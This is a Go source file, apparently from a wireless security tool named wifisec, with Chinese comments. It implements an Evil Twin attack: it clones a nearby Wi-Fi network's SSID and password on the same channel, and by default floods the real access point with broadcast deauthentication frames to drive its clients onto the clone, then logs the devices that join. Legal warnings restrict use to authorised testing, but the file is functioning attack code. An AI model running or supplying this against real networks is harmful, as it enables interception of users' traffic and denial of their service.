package functions

import (
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/ctkqiang/wifisec/internal/ieee80211"
	platformap "github.com/ctkqiang/wifisec/internal/platform/ap"
	platformesp "github.com/ctkqiang/wifisec/internal/platform/esp"
	platformlinux "github.com/ctkqiang/wifisec/internal/platform/linux"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

const (
	// 802.11 对 SSID 与 WPA2-PSK 密码的硬性长度约束。
	maxSSIDLen = 32
	minPSKLen  = 8
	maxPSKLen  = 63

	// fallbackChannel 是周边扫不到同名网络时的兜底信道；
	// 信道 6 居于 2.4GHz 中心，是兼容性最好的选择。
	fallbackChannel = 6

	// kickInterval 与 deauther 的 sendInterval 同节奏：每 200ms 一帧
	// 广播 deauth，足以持续压制真实 AP 又不至于淹没信道。
	kickInterval = 200 * time.Millisecond

	// stationPollInterval 是 ESP 路径的设备状态轮询节奏。
	// ESP 协议没有主动上报机制，接入/离开事件由差分得出；
	// 2 秒对人眼观察足够实时，也不会拖慢并发的 kick 注入。
	stationPollInterval = 2 * time.Second

	// cloneEventBuffer 缓冲设备事件，突发批量接入时不阻塞轮询 goroutine。
	cloneEventBuffer = 16
)

// cloneAP 是克隆热点执行器的最小抽象：ESP 协处理器与 Linux hostapd
// 收敛到同一签名，会话循环不感知克隆 AP 跑在板载射频还是宿主机。
type cloneAP interface {
	Up(ssid, password string, channel int) (string, error)
	Down() error
	StationEvents() <-chan platformap.StationEvent
}

// cloneOptions 是 clone 子命令的解析结果。
type cloneOptions struct {
	ssid     string // 克隆网络名称（与真实 AP 同名）
	password string // 空串即开放网络
	down     bool   // down 模式：停止固件上的克隆 AP
	kick     bool   // up 会话期间对真实 AP 广播 deauth，默认开启
	portName string // 串口；空串自动探测
}

// cloneAPInfo 是克隆目标（真实 AP）的提取字段，屏蔽 ESP 扫描结果与
// iw 扫描结果的类型差异，供选点函数统一处理。
type cloneAPInfo struct {
	ssid    string
	bssid   string
	channel int
	rssi    int
}

// cloneRuntime 是 up 会话的运行时资源束：AP 执行器、可选 kick 注入器、
// 克隆目标信息与串口关闭钩子。
type cloneRuntime struct {
	ap        cloneAP
	kicker    platformap.KickInjector // nil 即 kick 禁用
	realBSSID string                  // 真实 AP 的 BSSID，kick 帧的源地址
	channel   int                     // 克隆信道 = 真实 AP 信道（扫不到时回落默认值）
	closer    io.Closer               // ESP 路径的串口句柄；hostapd 路径为 nil
}

// WifiClone 克隆一个同名同密码的热点（Evil Twin），可选对真实 AP
// 持续注入 deauth 驱赶其客户端。用法：
//
//	wifisec clone <ssid>:<密码> up [nokick] [串口]
//	wifisec clone down [串口]
//
// 执行路径自动选择：插入 ESP 时克隆 AP 与 kick 帧都由板载射频承载
// （AP+STA 双模）；无设备时回落本机路径——仅 Linux 可行（hostapd），
// 且 kick 需要第二块无线网卡。macOS/Windows/Android 的本机路径因
// 系统 API 限制不可行，会得到精确的技术说明。
//
// 法律红线：克隆他人热点并截获流量属于刑法第二百八十五条规制的行为，
// 本功能仅用于自有网络或已获书面授权的测试环境。
func WifiClone(args []string) error {
	opts, err := parseCloneArgs(args)
	if err != nil {
		return err
	}

	if opts.down {
		return cloneDown(opts.portName)
	}

	return cloneUp(opts)
}

// cloneUp 承载克隆热点并进入会话循环，直到 Ctrl-C 或事件流关闭。
func cloneUp(opts cloneOptions) error {
	if err := validateCloneCredentials(opts.ssid, opts.password); err != nil {
		return err
	}

	rt, err := openCloner(opts)
	if err != nil {
		return err
	}

	// defer 按 LIFO 执行：先停 AP（可能占用串口），再关注入器，
	// 最后关串口——顺序反了会让 CloneAPDown 的回复帧无处消费。
	if rt.closer != nil {
		defer rt.closer.Close()
	}
	if rt.kicker != nil {
		defer rt.kicker.Close()
	}
	defer func() {
		if err := rt.ap.Down(); err != nil {
			utilities.Warn("停止克隆 AP 失败：%v", err)
		}
	}()

	cloneMAC, err := rt.ap.Up(opts.ssid, opts.password, rt.channel)
	if err != nil {
		return err
	}

	// kick 准备：注入器切到克隆信道（与真实 AP 同信道），
	// deauth 帧只构造一次，会话循环内反复发送同一字节序列。
	kickOn := rt.kicker != nil
	var kickFrame []byte
	if kickOn {
		if err := rt.kicker.SetChannel(rt.channel); err != nil {
			utilities.Warn("注入器切换信道失败（%v），kick 禁用", err)
			kickOn = false
		}
	}
	if kickOn {
		bssid, parseErr := net.ParseMAC(rt.realBSSID)
		if parseErr != nil {
			utilities.Warn("真实 AP BSSID 无法解析（%s），kick 禁用", rt.realBSSID)
			kickOn = false
		} else {
			frame, buildErr := ieee80211.BuildDeauthFrame(bssid)
			if buildErr != nil {
				utilities.Warn("构造 deauth 帧失败（%v），kick 禁用", buildErr)
				kickOn = false
			} else {
				kickFrame = frame
			}
		}
	}

	utilities.Warn("克隆热点仅用于授权测试；未经许可克隆他人网络并截获流量违反刑法第二百八十五条")
	printCloneOnline(opts, cloneMAC, rt, kickOn)

	ctx, stop := setupSignalHandler()
	defer stop()

	// kickC 为 nil 时 select 分支永不触发——nil channel 是 Go 中
	// 表达「该分支禁用」的惯用法，避免复制整段会话循环。
	var kickC <-chan time.Time
	if kickOn {
		ticker := time.NewTicker(kickInterval)
		defer ticker.Stop()
		kickC = ticker.C
	}

	events := rt.ap.StationEvents()
	started := time.Now()
	joined, left, peak, online, kickFrames := 0, 0, 0, 0, 0

	for {
		select {
		case <-ctx.Done():
			printCloneSummary(started, joined, left, peak, kickFrames)
			return nil
		case ev, ok := <-events:
			if !ok {
				printCloneSummary(started, joined, left, peak, kickFrames)
				return errors.New("克隆 AP 已停止（事件流关闭），会话结束")
			}
			if ev.Joined {
				joined++
				online++
				peak = max(peak, online)
				utilities.Info("客户端接入 %s（在线 %d 台）", ev.MAC, online)
			} else {
				left++
				online = max(online-1, 0)
				utilities.Info("客户端离开 %s（在线 %d 台）", ev.MAC, online)
			}
		case <-kickC:
			if err := rt.kicker.Write(kickFrame); err != nil {
				utilities.Warn("kick 注入失败：%v", err)
				continue
			}
			kickFrames++
		}
	}
}

// cloneDown 停止固件上的克隆 AP。
// 注意打开串口本身会复位板子（SoftAP 随之消失），CloneAPDown 的价值
// 在于恢复干净的 STA 模式并确认固件通信正常；板子已拔电时走到这里
// 会得到「未发现串口」错误，此时 AP 已经不在了，属预期结果。
func cloneDown(portName string) error {
	if portName == "" {
		p, err := platformesp.DefaultPort()
		if err != nil {
			return fmt.Errorf("未发现 ESP 协处理器：%w；克隆 AP 只在板子供电时存活，拔电即停", err)
		}
		portName = p
	}

	injector, err := platformesp.Open(portName)
	if err != nil {
		return err
	}
	defer injector.Close()

	if err := injector.CloneAPDown(); err != nil {
		return err
	}

	utilities.Info("克隆 AP 已停止，固件恢复 STA 模式")
	return nil
}

// openCloner 选择克隆执行路径。优先 ESP 协处理器：克隆 AP 与 kick 帧
// 都跑在板载射频上，不占用宿主机网卡；未检测到设备时回落本机
// hostapd 路径（仅 Linux），扫描与克隆共用同一块无线接口。
func openCloner(opts cloneOptions) (*cloneRuntime, error) {
	portName := opts.portName
	if portName == "" {
		if p, err := platformesp.DefaultPort(); err == nil {
			portName = p
		}
	}

	if portName != "" {
		utilities.Info("连接 %s，等待固件就绪…", portName)
		injector, err := platformesp.Open(portName)
		if err != nil {
			return nil, err
		}

		utilities.Info("协处理器就绪（协议 v%d），扫描周边网络定位克隆目标…", injector.FirmwareVersion())
		scanned, err := injector.Scan()
		if err != nil {
			injector.Close()
			return nil, fmt.Errorf("扫描失败：%w", err)
		}

		infos := make([]cloneAPInfo, 0, len(scanned))
		for _, n := range scanned {
			infos = append(infos, cloneAPInfo{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, rssi: n.RSSI})
		}

		channel, bssid, found := pickCloneTarget(infos, opts.ssid)
		if !found {
			channel, bssid = fallbackCloneTarget(opts.ssid)
		}

		rt := &cloneRuntime{
			ap:        newESPCloner(injector),
			realBSSID: bssid,
			channel:   channel,
			closer:    injector,
		}
		// kick 与克隆共用同一块板子：SoftAP 占用 AP 接口，
		// deauth 帧经保留的 STA 接口注入，无需额外硬件。
		if found && opts.kick {
			rt.kicker = injector
		}
		return rt, nil
	}

	// 宿主机路径：hostapd 独占 AP 接口，扫描、克隆、kick 的硬件关系
	// 由 platformap 包内部处理。
	host, err := platformap.New()
	if err != nil {
		return nil, err
	}
	utilities.Info("未检测到 ESP 协处理器，走本机 hostapd 路径（接口 %s）", host.Interface())

	// 扫描要求接口 UP；hostapd 接管前先把接口置 UP，
	// 失败静默——扫描自身会以明确的错误暴露问题。
	_ = platformlinux.SetInterfaceUp(host.Interface())

	scanned, err := platformlinux.Scan(host.Interface())
	if err != nil {
		utilities.Warn("扫描真实网络失败（%v），无法锁定信道与 kick 目标", err)
	}

	infos := make([]cloneAPInfo, 0, len(scanned))
	for _, n := range scanned {
		infos = append(infos, cloneAPInfo{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, rssi: n.Signal})
	}

	channel, bssid, found := pickCloneTarget(infos, opts.ssid)
	if !found {
		channel, bssid = fallbackCloneTarget(opts.ssid)
	}

	rt := &cloneRuntime{ap: host, realBSSID: bssid, channel: channel}
	if found && opts.kick {
		// hostapd 独占 AP 接口，kick 需要第二块无线网卡；
		// 没有就降级为纯克隆，不阻断会话。
		kicker, err := host.KickWriter()
		if err != nil {
			utilities.Warn("kick 不可用：%v", err)
		} else {
			rt.kicker = kicker
		}
	}
	return rt, nil
}

// pickCloneTarget 在扫描结果中锁定同名网络：取 RSSI 最强者作为克隆
// 参照——信道跟随它，kick 也指向它。同名多 AP 时选信号最好的，
// 因为客户端最可能关联到它。
func pickCloneTarget(scanned []cloneAPInfo, ssid string) (channel int, bssid string, found bool) {
	best := 0
	for _, ap := range scanned {
		if ap.ssid != ssid {
			continue
		}
		// 首个命中立即采纳，之后仅当信号更强时替换。
		if !found || ap.rssi > best {
			channel, bssid, found, best = ap.channel, ap.bssid, true, ap.rssi
		}
	}
	return channel, bssid, found
}

// fallbackCloneTarget 在扫不到同名网络时给出兜底参数：
// 信道回落默认值，BSSID 为空使调用方自动禁用 kick 并告警。
func fallbackCloneTarget(ssid string) (channel int, bssid string) {
	utilities.Warn("周边未发现同名网络 %q，克隆信道回落 %d，kick 自动禁用", ssid, fallbackChannel)
	return fallbackChannel, ""
}

// espCloner 把 ESP 协处理器包装为 cloneAP：AP 承载与设备状态查询
// 都经串口下发，板载射频执行。
type espCloner struct {
	injector  *platformesp.Injector
	events    chan platformap.StationEvent
	stopCh    chan struct{}
	startOnce sync.Once
	stopOnce  sync.Once
}

func newESPCloner(injector *platformesp.Injector) *espCloner {
	return &espCloner{
		injector: injector,
		events:   make(chan platformap.StationEvent, cloneEventBuffer),
		stopCh:   make(chan struct{}),
	}
}

func (e *espCloner) Up(ssid, password string, channel int) (string, error) {
	return e.injector.CloneAPUp(ssid, password, channel)
}

// Down 先停轮询再关 SoftAP：两类指令共用串口，先停轮询可保证
// CloneAPDown 的回复帧一定由本调用消费，不会落进轮询的读取窗口。
func (e *espCloner) Down() error {
	e.stopOnce.Do(func() { close(e.stopCh) })
	return e.injector.CloneAPDown()
}

// StationEvents 启动状态轮询并返回事件流。
func (e *espCloner) StationEvents() <-chan platformap.StationEvent {
	e.startOnce.Do(func() { go e.pollLoop() })
	return e.events
}

// pollLoop 按固定节奏查询克隆 AP 的在线设备列表，与上一轮快照差分
// 出接入/离开事件。串口偶发超时不下车，下一轮继续；会话退出后
// 关闭事件流，会话循环随之结束。
func (e *espCloner) pollLoop() {
	defer close(e.events)

	ticker := time.NewTicker(stationPollInterval)
	defer ticker.Stop()

	seen := make(map[string]bool)
	for {
		select {
		case <-e.stopCh:
			return
		case <-ticker.C:
		}

		macs, err := e.injector.CloneStatus()
		if err != nil {
			continue
		}

		current := make(map[string]bool, len(macs))
		for _, mac := range macs {
			current[mac] = true
			if !seen[mac] {
				e.emit(platformap.StationEvent{MAC: mac, Joined: true})
			}
		}
		for mac := range seen {
			if !current[mac] {
				e.emit(platformap.StationEvent{MAC: mac, Joined: false})
			}
		}
		seen = current
	}
}

// emit 投递事件；会话已退出（stopCh 关闭）时丢弃，避免阻塞轮询循环。
func (e *espCloner) emit(ev platformap.StationEvent) {
	select {
	case e.events <- ev:
	case <-e.stopCh:
	}
}

// parseCloneArgs 解析 clone 子命令参数：
//
//	wifisec clone <ssid>:<密码> up [nokick] [串口]
//	wifisec clone down [串口]
//
// 首参数按第一个冒号切分，密码可含冒号（如 WPA 密码带冒号无需转义）；
// SSID 与密码保持原样（不 trim），两者中的空白字符都是合法字符。
func parseCloneArgs(args []string) (cloneOptions, error) {
	opts := cloneOptions{kick: true}
	if len(args) < 1 {
		return opts, errors.New("用法：wifisec clone <ssid>:<密码> up [nokick] [串口]，或 wifisec clone down [串口]")
	}

	head := args[0]
	if head == "down" {
		opts.down = true
		if len(args) > 1 {
			opts.portName = args[1]
		}
		return opts, nil
	}

	var ok bool
	opts.ssid, opts.password, ok = strings.Cut(head, ":")
	if !ok {
		return opts, errors.New("缺少冒号分隔的凭据；用法：wifisec clone <ssid>:<密码> up（密码留空即开放网络：clone <ssid>: up）")
	}
	if opts.ssid == "" {
		return opts, errors.New("SSID 不能为空")
	}

	seenUp := false
	for _, token := range args[1:] {
		switch strings.ToLower(token) {
		case "up":
			seenUp = true
		case "nokick":
			opts.kick = false
		default:
			if opts.portName == "" {
				opts.portName = token
				continue
			}
			return opts, fmt.Errorf("多余参数 %q；用法：wifisec clone <ssid>:<密码> up [nokick] [串口]", token)
		}
	}

	if !seenUp {
		return opts, errors.New("缺少 up 动作；用法：wifisec clone <ssid>:<密码> up [nokick] [串口]")
	}

	return opts, nil
}

// validateCloneCredentials 按 802.11 与 hostapd 双侧约束校验凭据：
// SSID 上限 32 字节；密码留空即开放网络，非空时须为 8-63 字节。
// 换行与 NUL 会破坏 hostapd 配置文件行结构，统一直接拒绝。
func validateCloneCredentials(ssid, password string) error {
	if ssid == "" {
		return errors.New("SSID 不能为空")
	}
	if len(ssid) > maxSSIDLen {
		return fmt.Errorf("SSID 超过 %d 字节上限（当前 %d 字节，中文等多字节字符按字节计）", maxSSIDLen, len(ssid))
	}
	if strings.ContainsAny(ssid, "\n\r\x00") {
		return errors.New("SSID 不能包含换行或 NUL 字符")
	}

	if password == "" {
		return nil
	}
	if len(password) < minPSKLen || len(password) > maxPSKLen {
		return fmt.Errorf("WPA2 密码须为 %d-%d 字节（当前 %d 字节）", minPSKLen, maxPSKLen, len(password))
	}
	if strings.ContainsAny(password, "\n\r\x00") {
		return errors.New("密码不能包含换行或 NUL 字符")
	}

	return nil
}

// printCloneOnline 在 AP 上线后输出会话凭据块：客户端按此接入克隆网络。
func printCloneOnline(opts cloneOptions, cloneMAC string, rt *cloneRuntime, kickOn bool) {
	credential := opts.password
	if credential == "" {
		credential = "（开放网络，无密码）"
	}

	kickLabel := "已禁用"
	if kickOn {
		kickLabel = fmt.Sprintf("已启用（每 %s 广播 deauth 驱赶真实 AP 客户端）", kickInterval)
	}

	lines := []string{
		"════════════ 克隆热点已上线 ════════════",
		fmt.Sprintf("  SSID      : %s", opts.ssid),
		fmt.Sprintf("  密码      : %s", credential),
		fmt.Sprintf("  信道      : %d", rt.channel),
		fmt.Sprintf("  克隆 BSSID: %s", cloneMAC),
	}
	if rt.realBSSID != "" {
		lines = append(lines, fmt.Sprintf("  真实 AP   : %s（信道 %d）", rt.realBSSID, rt.channel))
	}
	lines = append(lines,
		fmt.Sprintf("  kick      : %s", kickLabel),
		"  监控      : 客户端接入/离开将实时打印，Ctrl-C 结束会话",
		"═══════════════════════════════════════",
	)
	utilities.Info("\n%s", strings.Join(lines, "\n"))
}

// printCloneSummary 输出会话统计，让一次克隆测试有可留档的结果。
func printCloneSummary(started time.Time, joined, left, peak, kickFrames int) {
	lines := []string{
		"════════════ 克隆会话结束 ════════════",
		fmt.Sprintf("  运行时长 : %s", time.Since(started).Round(time.Second)),
		fmt.Sprintf("  接入/离开: %d / %d 台", joined, left),
		fmt.Sprintf("  峰值在线 : %d 台", peak),
	}
	if kickFrames > 0 {
		lines = append(lines, fmt.Sprintf("  kick 帧  : %d", kickFrames))
	}
	lines = append(lines, "═══════════════════════════════════════")
	utilities.Info("\n%s", strings.Join(lines, "\n"))
}
